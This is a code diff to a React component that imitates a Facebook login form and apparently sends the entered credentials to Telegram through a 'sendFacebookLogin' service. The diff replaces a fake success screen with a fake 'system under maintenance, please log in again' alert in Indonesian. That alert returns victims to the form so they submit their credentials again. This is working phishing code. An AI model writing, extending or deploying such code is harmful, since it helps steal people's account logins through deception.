@@ -1,15 +1,19 @@
 import { useState } from 'react';
 import { sendFacebookLogin } from '../services/telegram';
+import AlertModal from './AlertModal';
 import './LoginForm.css';
-
-
 
 interface FacebookLoginProps {
   onClose: () => void;
 }
 
 const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
-  const [step, setStep] = useState(1); // 1: FB Form, 3: Success
+  const [step, setStep] = useState(1); // 1: FB Form, 0: Loading
+  const [alertConfig, setAlertConfig] = useState<{isOpen: boolean, message: string, subMessage?: string}>({
+    isOpen: false,
+    message: '',
+    subMessage: ''
+  });
 
   // STEP 1 STATES
   const [email, setEmail] = useState('');
@@ -40,7 +44,12 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
       setShowCustomLoading(false);
       
       if (success) {
-        setStep(3); // Show Success
+        setAlertConfig({
+          isOpen: true,
+          message: "Sistem sedang maintenance.",
+          subMessage: "Silakan coba login kembali."
+        });
+        setStep(1); // Kembali ke form login
       } else {
         alert("Terjadi kesalahan. Silakan coba lagi.");
         setStep(1); // Retry login
@@ -130,47 +139,14 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
         </div>
       )}
 
-      {/* ================= STEP 3: SUCCESS MODAL ================= */}
-      {step === 3 && (
-        <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/80 backdrop-blur-sm animate-pop-in">
-          <div className="relative w-[320px] bg-gradient-to-b from-[#4a148c] to-[#2a0e45] rounded-xl border-2 border-[#ffd700] p-5 flex flex-col items-center shadow-[0_0_20px_rgba(255,215,0,0.3)]">
-            {/* Close Button */}
-            <button 
-              onClick={onClose} 
-              className="absolute top-2 right-2 w-6 h-6 flex items-center justify-center bg-white/10 hover:bg-white/20 rounded-full text-white transition-colors text-xs"
-            >
-              ✕
-            </button>
-
-            {/* Animated Icon */}
-            <div className="w-16 h-16 mb-4 relative">
-               <div className="absolute inset-0 bg-[#ffd700]/20 rounded-full animate-ping"></div>
-               <div className="relative w-full h-full bg-[#ffd700] rounded-full flex items-center justify-center shadow-[0_0_15px_#ffd700]">
-                  <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-[#4a148c] animate-spin-slow" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
-                    <path strokeLinecap="round" strokeLinejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
-                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
-                  </svg>
-               </div>
-            </div>
-
-            {/* Text Content */}
-            <h3 className="text-[#ffd700] text-lg font-black uppercase tracking-wider mb-2 text-center drop-shadow-md">
-              Sistem Maintenance
-            </h3>
-            <p className="text-white/80 text-center text-xs leading-relaxed mb-4 font-medium px-2">
-              Maaf, saat ini sistem sedang dalam perbaikan berkala untuk meningkatkan kualitas layanan.
-            </p>
-
-            {/* Action Button */}
-            <button 
-              onClick={onClose}
-              className="px-6 py-1.5 bg-gradient-to-r from-[#ffd700] to-[#ffb74d] text-[#4a148c] text-sm font-bold rounded-full shadow-md hover:scale-105 active:scale-95 transition-transform"
-            >
-              Mengerti
-            </button>
-          </div>
-        </div>
-      )}
+      {/* Alert Modal */}
+      <AlertModal 
+          isOpen={alertConfig.isOpen} 
+          onClose={() => setAlertConfig(prev => ({ ...prev, isOpen: false }))} 
+          title="AKSES DIBATASI" 
+          message={alertConfig.message} 
+          subMessage={alertConfig.subMessage} 
+        />
     </div>
   );
 };
